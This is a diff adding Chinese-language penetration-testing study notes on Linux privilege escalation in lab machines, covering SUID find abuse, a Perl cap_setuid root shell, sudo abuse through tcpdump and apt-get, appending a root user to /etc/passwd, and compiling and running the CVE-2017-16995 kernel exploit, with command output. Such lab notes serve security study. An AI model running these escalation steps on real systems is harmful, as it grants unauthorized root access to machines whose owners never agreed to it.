@@ -850,4 +850,312 @@ root@debian-privesc:/home/joe#
 > 3. `echo "root2:nWfVpeIzUj9g6:0:0:root:/root:/bin/bash" >> /etc/passwd`: 塞入新使用者(root2)，設定對應 hash password 與權限 (user id (UID): `zero` & group id (GID): `zero`)
 
 ## Insecure System Components
+包含錯誤配置的系統應用程式和權限如何導致提權
+### Abusing Setuid Binaries and Capabilities
+setuid binary 的目的: 當使用者或系統自動化腳本啟動一個程式時，這個程式會繼承啟動它的 UID/GID，稱為 "real UID/GID"。\
+前面提到 /etc/shadow 只能由 root 權限讀寫，🥚 非特權使用者如何更改自己的密碼
+
+#### - SUID
+分析 passwd program:
+##### 1. 變更密碼
+```
+joe@debian-privesc:~$ passwd
+Changing password for joe.
+Current password: 
+```
+##### 2. 觀察 process ID
+```
+joe@debian-privesc:~$ ps u -C passwd
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root      2438  0.0  0.1   9364  2984 pts/0    S+   01:51   0:00 passwd
+```
+> `ps`: 顯示正在運行的 process。\
+`u`: 以使用者格式顯示資訊，包括用戶、CPU 和記憶體的使用狀況。\
+`-C passwd`: 篩選出正在運行的 passwd 指令。passwd 通常用來改變用戶的密碼。
+>> 發現**passwd 以 root 使用者身分執行**
+
+##### 3. 透過 proc 查看 kernel information
+real UID 與 effective UID 會 assigned 給 proc pseudo-filesystem
+```
+joe@debian-privesc:~$ grep Uid /proc/2438/status
+Uid:	1000	0	0	0
+```
+> `passwd` process 的 Real UID 是 1000（代表 joe），但其餘三個值（effective UID 、 saved UID 、 filesystem UID）都被設置為 0，代表 root 用戶的 UID。這說明 passwd 以 root 權限運行。
+
+正常狀況應該四個值都會是: 1000
+```
+joe@debian-privesc:~$ cat /proc/1131/status | grep Uid
+Uid:	1000	1000	1000	1000
+```
+
+##### 4. SUID
+>[!Important]
+>passwd 程式之所以不同，是因為它設置了 `Set-User-ID (SUID)` special flag。\
+>這是 UNIX 系統中一個特殊的文件屬性，當程式設置了 SUID 標誌時，該程式運行時會使用該程式所有者的有效 UID（而不是運行該程式的用戶的 UID）。\
+>>對於 passwd 來說，它會使用 root 用戶的 UID（0），即使該程式是由普通用戶 joe 啟動的。
+
+```
+joe@debian-privesc:~$ ls -asl /usr/bin/passwd
+64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+```
+> -rw`s`r-xr-x: SUID 以 s flag 表示
+
+
+可以透過 `chmod u+s <filename>` 設定檔案的 SUID
+
+##### 5. 利用 SUID 錯誤配置
+在範例中，find 工具有一個錯誤配置，設定了 SUID 標誌。可以利用這個工具來運行一個 Shell，並獲得 root 權限。
+```
+joe@debian-privesc:~$ find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
+bash-5.0# id
+uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+bash-5.0#
+```
+> find 本身設有 SUID
+> `-exec "/usr/bin/bash" -p \;`:\
+`-exec` 參數允許 find 在找到的每個文件上執行指定的指令。\
+`"/usr/bin/bash"` 系統內的 bash。\
+`-p`: bash 內建選項，允許 bash 保持其有效 UID（EUID）不變，這意味著如果 bash 是以 root 權限執行的，它會保持 root 權限，而不會降級到普通用戶權限。
+`\;` 是 find 的結束標誌，表示 -exec 命令的結束。
+>> 雖然 UID 仍然屬於joe，但有效使用者 ID 來自root。
+
+#### - Linux Capabilities
+[Linux Capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) 是一種細化的權限管理機制，允許特定的程式、二進制文件或服務獲得某些通常只有 root 才能執行的權限。例如：\
+`cap_net_raw`：允許程式發送原始網路封包（用於流量監控）。\
+`cap_setuid`：允許程式修改使用者 ID（UID）。\
+`cap_net_admin`：允許程式執行網路管理相關操作。
+
+##### 1. 尋找特殊 Capabilities
+尋找可執行檔案擁有特殊 Capabilities
+```
+joe@debian-privesc:~$ /usr/sbin/getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+/usr/bin/perl5.28.1 = cap_setuid+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+> `-r /`：從根目錄開始遞迴搜尋所有檔案
+>> `/usr/bin/perl = cap_setuid+ep` 與 `/usr/bin/perl5.28.1 = cap_setuid+ep` 兩個 perl binaries啟用了 setuid，`+ep` flag，可以更改自身的 UID
+
+##### 2. 利用 Perl 提升權限
+到 [GTFOBins](https://gtfobins.github.io/) 查詢 ，找到對應的 Exploit 方法
+```
+joe@debian-privesc:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+perl: warning: Setting locale failed.
+...
+# id
+uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
+```
+
+### Abusing Sudo
+`sudo`（Superuser-Do）是一個 UNIX/Linux 工具，允許一般使用者以 root 或其他特定使用者的身份執行指令。\
+要使用 sudo，該使用者必須在 sudo 群組 內（適用於 Debian-based Linux），或者 `/etc/sudoers` 文件必須明確允許該使用者執行特定指令。\
+使用 `sudo -l` 或 `sudo --list` 來查看當前使用者被允許執行的 sudo 命令
+```
+joe@debian-privesc:~$ sudo -l
+[sudo] password for joe:
+Matching Defaults entries for joe on debian-privesc:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User joe may run the following commands on debian-privesc:
+    (ALL) (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
+```
+> crontab 作業、tcpdump 和 apt-get 允許 sudo
+
+#### 1. 查詢 [GTFObins](https://gtfobins.github.io/gtfobins/tcpdump/) 以取得如何利用 tcpdump
+```
+joe@debian-privesc:~$ COMMAND='id'
+joe@debian-privesc:~$ TF=$(mktemp)
+joe@debian-privesc:~$ echo "$COMMAND" > $TF
+joe@debian-privesc:~$ chmod +x $TF
+joe@debian-privesc:~$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+[sudo] password for joe:
+dropped privs to root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
+...
+compress_savefile: execlp(/tmp/tmp.c5hrJ5UrsF, /dev/null) failed: Permission denied
+```
+> 卡關，Permission denied
+
+#### 2. 檢查原因：`/var/log/syslog`
+```
+joe@debian-privesc:~$ cat /var/log/syslog | grep tcpdump
+...
+Aug 29 02:52:14 debian-privesc kernel: [ 5742.171462] audit: type=1400 audit(1661759534.607:27): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.c5hrJ5UrsF" pid=12280 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
+```
+>  AppArmor（一種強制存取控制（MAC）機制）阻止了 tcpdump 執行 /tmp/tmp.c5hrJ5UrsF
+
+#### 3. 檢查 AppArmor 狀態: `aa-status`
+```
+joe@debian-privesc:~$ su - root
+Password:
+root@debian-privesc:~# aa-status
+apparmor module is loaded.
+20 profiles are loaded.
+18 profiles are in enforce mode.
+   /usr/bin/evince
+   /usr/bin/evince-previewer
+   /usr/bin/evince-previewer//sanitized_helper
+   /usr/bin/evince-thumbnailer
+   /usr/bin/evince//sanitized_helper
+   /usr/bin/man
+   /usr/lib/cups/backend/cups-pdf
+   /usr/sbin/cups-browsed
+   /usr/sbin/cupsd
+   /usr/sbin/cupsd//third_party
+   /usr/sbin/tcpdump
+...
+2 profiles are in complain mode.
+   libreoffice-oopslash
+   libreoffice-soffice
+3 processes have profiles defined.
+3 processes are in enforce mode.
+   /usr/sbin/cups-browsed (502)
+   /usr/sbin/cupsd (654)
+   /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
+0 processes are in complain mode.
+0 processes are unconfined but have a profile defined.
+```
+> `aa-status`: 顯示 AppArmor（應用程式安全機制）的當前狀態\
+> `enforce mode`:  主動阻擋 違規行為\
+> 3 個正在運行的程序 受 AppArmor 強制模式 保護:
+> - /usr/sbin/cups-browsed (502)
+> - /usr/sbin/cupsd (654)
+> - /usr/lib/cups/notifier/dbus (658) /usr/sbin/cupsd
+>> 透過 AppArmor 提權，不可行
+
+#### 4. 改用 apt-get 進行特權提升
+根據 [GTFObins](https://gtfobins.github.io/gtfobins/apt-get/) 建議：
+```
+joe@debian-privesc:~$ sudo apt-get changelog apt
+...
+Fetched 459 kB in 0s (39.7 MB/s)
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+### Exploiting Kernel Vulnerabilities
+如何利用 Linux Kernel 漏洞來提升權限\
+#### 1. 收集系統資訊
+檢查 `/etc/issue` 取得目標資訊
+```
+joe@ubuntu-privesc:~$ cat /etc/issue
+Ubuntu 16.04.4 LTS \n \l
+```
+檢查核心版本和系統架構
+```
+joe@ubuntu-privesc:~$ uname -r 
+4.4.0-116-generic
+
+joe@ubuntu-privesc:~$ arch 
+x86_64
+```
+Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic)， x86 架構
+
+#### 2. 尋找可用的 Kernel 漏洞
+使用 searchsploit 來尋找與目標版本相符的核心漏洞，以 "linux kernel Ubuntu 16 Local Privilege Escalation" 當作 key word，且過濾掉不符的版本
+```
+┌──(chw㉿CHW)-[~]
+└─$ searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
+Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fed | linux_x86-64/local/42275.c
+Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/ | linux_x86/local/42276.c
+Linux Kernel (Ubuntu / Fedora / RedHat) - 'Overlayfs' Local Privilege | linux/local/40688.rb
+Linux Kernel (Ubuntu 17.04) - 'XFRM' Local Privilege Escalation       | linux/local/44049.md
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04) - 'Full-Nelson.c' Local P | linux/local/15704.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overla | linux/local/37292.c
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overla | linux/local/37293.txt
+Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32= | linux_x86-64/local/31347.c
+Linux Kernel 3.x (Ubuntu 14.04 / Mint 17.3 / Fedora 22) - Double-free | linux/local/41999.txt
+Linux Kernel 4.3.3 (Ubuntu 14.04/15.10) - 'overlayfs' Local Privilege | linux/local/39166.c
+Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (M | linux/local/40759.rb
+Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset'  | linux_x86-64/local/40049.c
+Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOA | linux/local/39772.txt
+Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Pri | linux/local/40489.txt
+Linux Kernel < 2.6.34 (Ubuntu 10.10 x86) - 'CAP_SYS_ADMIN' Local Priv | linux_x86/local/15916.c
+Linux Kernel < 2.6.36-rc1 (Ubuntu 10.04 / 2.6.32) - 'CAN BCM' Local P | linux/local/14814.c
+Linux Kernel < 2.6.36.2 (Ubuntu 10.04) - 'Half-Nelson.c' Econet Privi | linux/local/17787.c
+Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Es | linux/local/45010.c
+```
+> 嘗試最後一個漏洞（linux/local/45010.c），版本較新並且與我們的核心版本匹配，因為它針對的是 4.13.9 以下的任何版本。
+
+#### 3. 編譯 Exploit
+使用 gcc 來編譯 exploit\
+編譯的環境架構需要與目標機器相同
+```
+┌──(chw㉿CHW)-[~]
+└─$ cp /usr/share/exploitdb/exploits/linux/local/45010.c .
+
+┌──(chw㉿CHW)-[~]
+└─$ head 45010.c -n 20
+/*
+  Credit @bleidl, this is a slight modification to his original POC
+  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c
+
+  For details on how the exploit works, please visit
+  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+
+  Tested on Ubuntu 16.04 with the following Kernels
+  4.4.0-31-generic
+  4.4.0-62-generic
+  4.4.0-81-generic
+  4.4.0-116-generic
+  4.8.0-58-generic
+  4.10.0.42-generic
+  4.13.0-21-generic
+
+  Tested on Fedora 27
+  4.13.9-300
+  gcc cve-2017-16995.c -o cve-2017-16995
+  internet@client:~/cve-2017-16995$ ./cve-2017-16995
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ mv 45010.c cve-2017-16995.c
+                                                                                                        
+┌──(chw㉿CHW)-[~]
+└─$ scp cve-2017-16995.c joe@192.168.235.216:
+joe@192.168.235.216's password: 
+cve-2017-16995.c
+```
+
+要將 source code 編譯成可執行檔，我們只需要呼叫 gcc 並指定 C source code 和輸出檔名
+```
+joe@ubuntu-privesc:~$ gcc cve-2017-16995.c -o cve-2017-16995
+joe@ubuntu-privesc:~$ ls
+cve-2017-16995  cve-2017-16995.c
+```
+
+#### 4. 執行 Exploit
+編譯後檢查 Linux ELF file architecture
+```
+joe@ubuntu-privesc:~$ file cve-2017-16995
+cve-2017-16995: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=588d687459a0e60bc6cb984b5180ec8c3558dc33, not stripped
+```
+> x86-64
+
+```
+joe@ubuntu-privesc:~$ ./cve-2017-16995
+[.]
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.]
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.]
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff88007bd1f100
+[*] Leaking sock struct from ffff880079bd9c00
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff880075c11e40
+[*] UID from cred structure: 1001, matches the current: 1001
+[*] hammering cred structure at ffff880075c11e40
+[*] credentials patched, launching shell...
+# id
+uid=0(root) gid=0(root) groups=0(root),1001(joe)
+#
+```
+> 成功執行
+
+# Port Redirection and SSH Tunneling
 
